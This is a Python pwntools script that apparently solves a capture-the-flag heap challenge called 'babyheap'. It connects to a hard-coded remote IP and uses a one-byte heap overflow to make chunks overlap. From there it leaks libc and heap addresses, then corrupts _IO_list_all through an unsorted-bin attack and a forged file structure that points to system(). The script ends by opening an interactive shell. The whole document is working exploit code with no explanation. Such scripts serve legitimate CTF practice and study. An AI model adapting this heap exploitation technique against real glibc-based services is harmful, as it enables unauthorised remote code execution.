#!/usr/bin/env python

from pwn import *
import os

context.log_level = "debug"

elf = "./babyheap"
ENV = {"LD_PRELOAD":"./libc-2.24.so"}

system_off = 0x3f480
io_list_all_off = 0x39a500
unsorted_bin_off = 0x399b58

#p = process(elf, env=ENV)
#p = remote("182.254.230.85", 1234)
p = remote("202.120.7.204", 127)

def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def update(idx, size, s):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(s)

def delete(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))


alloc(0x58) # 0
alloc(0x28) # 1
alloc(0x38) # 2
alloc(0x58) # 3
alloc(0x58) # 4
alloc(0x58) # 5

update(0, 0x59, "A"*0x58+p8(0xd1))
delete(1)

alloc(0x28) # 1
view(2)
p.recvuntil("Chunk[2]: ")
libc_base = u64(p.recv(8))-unsorted_bin_off
log.info("libc_base: "+hex(libc_base))

io_list_all = libc_base+io_list_all_off
unsorted_bin = libc_base+unsorted_bin_off
system_addr = libc_base+system_off
io_str_jumps = libc_base+0x396500
#0x76000

alloc(0x58) # 6

payload = p8(0)*0x38
payload += p64(0x61)
update(6, 0x40, payload)

delete(0)
delete(3)
view(6)
p.recvuntil("Chunk[6]: ")
p.recv(0x40)
heap_base = u64(p.recv(8))
log.info("heap_base: "+hex(heap_base))

alloc(0x58) # 0

payload = p8(0)*0x18
#payload += "/bin/sh\x00"
payload += p64(0x61)
payload += p64(unsorted_bin)
payload += p64(io_list_all-0x10)
payload += p64(0)
payload += p64(0x7fffffffffffffff)
payload += p64(0)*2
payload += p64(((heap_base+0x10)-0x64)/2)
payload += p8(0)
update(0, 0x59, payload)

payload = p8(0)*0x28
payload += p64(io_str_jumps)
payload += p64(system_addr)
payload += p8(0)*0x18
update(5, 0x50, payload)

payload = p8(0)*0x59
#payload += p64(system_addr)
#payload += p8(0)*0x39
update(4, 0x59, payload)

alloc(0x58) # 3
update(3, 0x8, "/bin/sh\x00")

alloc(0x10)

p.interactive()
